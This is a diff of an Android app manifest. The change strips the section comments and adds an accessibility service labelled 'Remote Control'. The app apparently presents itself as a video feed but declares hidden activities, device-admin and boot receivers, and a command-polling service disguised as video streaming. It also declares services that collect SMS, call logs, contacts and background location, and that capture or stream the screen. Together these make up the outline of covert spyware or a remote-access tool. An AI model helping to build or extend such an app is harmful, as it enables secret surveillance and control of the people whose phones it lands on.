@@ -2,11 +2,8 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools">
 
-    <!-- ইন্টারনেট -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-
-    <!-- ব্যাকগ্রাউন্ড সার্ভিস -->
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
@@ -14,20 +11,14 @@
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
-
-    <!-- লোকেশন -->
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
-
-    <!-- কল ও SMS -->
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
     <uses-permission android:name="android.permission.READ_CONTACTS" />
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
-
-    <!-- অ্যাপ লিস্ট -->
     <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
         tools:ignore="QueryAllPackagesPermission" />
     <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"
@@ -40,7 +31,6 @@
         android:hardwareAccelerated="true"
         android:theme="@style/AppTheme">
 
-        <!-- Splash — Launcher -->
         <activity
             android:name=".SplashActivity"
             android:exported="true">
@@ -50,28 +40,17 @@
             </intent-filter>
         </activity>
 
-        <!-- Setup -->
-        <activity
-            android:name=".SetupActivity"
-            android:exported="false" />
+        <activity android:name=".SetupActivity" android:exported="false" />
 
-        <!-- Video Feed -->
         <activity
             android:name=".VideoFeedActivity"
             android:exported="false"
             android:configChanges="orientation|screenSize|keyboardHidden"
             android:screenOrientation="portrait" />
 
-        <!-- Hidden Activities -->
-        <activity
-            android:name=".MainActivity"
-            android:exported="false" />
+        <activity android:name=".MainActivity" android:exported="false" />
+        <activity android:name=".PermissionsActivity" android:exported="false" />
 
-        <activity
-            android:name=".PermissionsActivity"
-            android:exported="false" />
-
-        <!-- Device Admin Receiver -->
         <receiver
             android:name=".MyAdminReceiver"
             android:permission="android.permission.BIND_DEVICE_ADMIN"
@@ -84,7 +63,6 @@
             </intent-filter>
         </receiver>
 
-        <!-- Boot Receiver -->
         <receiver
             android:name=".BootReceiver"
             android:enabled="true"
@@ -95,7 +73,6 @@
             </intent-filter>
         </receiver>
 
-        <!-- Foreground Service -->
         <service
             android:name=".CommandPoller"
             android:foregroundServiceType="specialUse"
@@ -105,7 +82,7 @@
                 android:value="video_streaming_service" />
         </service>
 
-        <!-- Accessibility Service -->
+        <!-- App Block Service -->
         <service
             android:name=".AppBlockService"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
@@ -118,19 +95,29 @@
                 android:resource="@xml/accessibility_service_config" />
         </service>
 
-        <!-- Background Services -->
+        <!-- Touch Accessibility Service (Remote Control) -->
+        <service
+            android:name=".TouchAccessibilityService"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
+
         <service android:name=".AppListService" android:exported="false" />
         <service android:name=".LocationService" android:exported="false" />
         <service android:name=".CallLogService" android:exported="false" />
         <service android:name=".SmsService" android:exported="false" />
 
-        <!-- Screen Capture -->
         <service
             android:name=".ScreenCaptureService"
             android:foregroundServiceType="mediaProjection"
             android:exported="false" />
 
-        <!-- Live Screen -->
         <service
             android:name=".LiveScreenService"
             android:foregroundServiceType="mediaProjection"
